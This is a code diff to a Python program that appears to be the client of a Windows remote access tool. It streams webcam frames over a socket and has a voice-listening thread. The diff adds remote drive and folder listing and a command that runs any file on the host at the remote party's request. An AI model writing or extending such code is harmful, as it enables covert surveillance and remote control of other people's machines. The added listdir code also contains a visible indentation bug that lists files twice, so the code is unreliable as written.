@@ -85,7 +85,7 @@ class WatchCamera:
 
                 image_data = pickle.dumps(image_data)
                 image_len = len(image_data)
-                self.soket.sendall(bytes(str(image_len).zfill(10),'utf-8'))
+                self.soket.sendall(str(image_len).zfill(10).encode("utf-8"))
                 self.soket.sendall(image_data)
 
             except Exception as e:
@@ -170,12 +170,45 @@ class FileManager:
         command = data["command"]
         print("command datası: ",data)
         if command == "disks":
-            disks = [x for x in GetLogicalDriveStrings().split("\x00")[:-1]]
-            data = pickle.dumps(disks)
+            dirs = []
+            for i in GetLogicalDriveStrings().split("\x00")[:-1]:
+                try:
+                    size = len(os.listdir(i))
+                except:
+                    size = -1
+                dirs.append({"type":"dir","path":i,"size":size})
+            data = pickle.dumps(dirs)
             data_length = str(len(data)).zfill(10).encode()
             self.soket.sendall(data_length)
             self.soket.sendall(data)
-        
+        elif command == "startfile":
+            path = data["path"]
+            try:os.startfile(path)
+            except:pass
+        elif command == "listdir":
+            path = data["path"]
+            content = []
+            try:
+                for i in os.listdir(path):
+                    if os.path.isfile(os.path.join(path,i)):
+                        try:
+                            size = os.path.getsize(os.path.join(path,i))
+                        except:
+                            size = -1
+                        content.append({"type":"file","path":os.path.join(path,i),"size":FileManager.convertSizeType(size)})
+                    else:
+                        try:
+                            size = len(os.listdir(os.path.join(path,i)))
+                        except:
+                            size = -1
+                    content.append({"type":"dir","path":os.path.join(path,i),"size":size})
+            except:
+                pass
+            data = pickle.dumps(content)
+            data_length = str(len(data)).zfill(10).encode()
+            
+            self.soket.sendall(data_length)
+            self.soket.sendall(data)
 
     def stop(self):
         self.is_alive = False
@@ -184,6 +217,22 @@ class FileManager:
         except:
             pass
 
+    @staticmethod
+    def convertSizeType(size: int) -> str:
+        if size == -1:
+            return "---"
+        if (size / 1024) > 1:
+            kb = size / 1024
+            sizeText = format(kb, ".2f") + " Kb"
+            if (kb / 1024) > 1:
+                mb = kb / 1024
+                sizeText = format(mb, ".2f") + " Mb"
+                if (mb / 1024) > 1:
+                    gb = mb / 1024
+                    sizeText = format(gb, ".2f") + " Gb"
+        else:
+            sizeText = str(size) + " byte"
+        return sizeText
 
 
 class ListenVoice(Thread):
